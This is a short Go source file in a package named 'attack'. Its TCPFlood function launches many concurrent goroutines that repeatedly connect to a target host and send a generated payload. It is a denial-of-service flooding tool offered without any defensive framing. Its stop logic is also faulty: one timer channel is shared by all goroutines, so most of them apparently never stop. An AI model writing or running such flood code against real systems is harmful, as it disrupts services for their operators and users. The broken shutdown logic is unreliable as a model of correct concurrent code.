package attack

import (
	"fmt"
	"net"
	"sync"
	"time"
)

func TCPFlood(target string, threads, duration int) {
	var wg sync.WaitGroup
	stop := time.After(time.Duration(duration) * time.Second)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					conn, err := net.DialTimeout("tcp", target, 1*time.Second)
					if err == nil {
						conn.Write([]byte(GenPayload()))
						conn.Close()
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Println("TCP flood complete.")
}
